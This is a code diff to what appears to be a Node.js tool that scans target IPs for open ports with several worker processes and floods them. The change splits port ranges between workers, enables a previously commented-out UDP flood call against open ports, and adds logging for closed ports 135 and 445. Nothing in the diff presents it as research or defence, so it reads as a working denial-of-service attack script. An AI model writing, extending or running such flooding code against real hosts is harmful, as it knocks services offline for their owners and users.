@@ -65,8 +65,13 @@ if (host) {
         for (let i = 0; i < ips.length; i++) {
             const ip = ips[i];
             let [start, end] = findStartAndEndPorts(workerId, numCPUs);
-            // start = 500;
-            // end = 3000;
+            if (workerId === '1') {
+                start = 0;
+                end = 2999;
+            } else if (workerId === '2') {
+                start = 3000;
+                end = 5999;
+            }
             console.log(`*** Worker ${process.pid} starting on ${ip} using range: (${start}, ${end}) ***`);
             for (start; start <= end; start++) {
                 const scannedPort = start;
@@ -84,7 +89,7 @@ if (host) {
                                     break;
                                 case 'UDP':
                                     console.log(`Worker ${process.pid} is flooding ${ip} using open port: ${scannedPort}`);
-                                    // udpFlood(ip, port, timeout, process.pid);
+                                    udpFlood(ip, port, timeout, process.pid);
                                     break;
                                 case 'PING':
                                     // pingFlood(ip, port, timeout, process.pid);
@@ -95,7 +100,7 @@ if (host) {
                                     console.log('flooding');
                             }
                         } else {
-                            if (scannedPort === 3000) {
+                            if (scannedPort === 3000 || scannedPort === 135 || scannedPort === 445) {
                                 console.log(`Worker ${process.pid} at ${ip} found a closed port: ${scannedPort}`)
                             }
                             // console.log(`Worker ${process.pid} at ${ip} found a closed port: ${scannedPort}`)
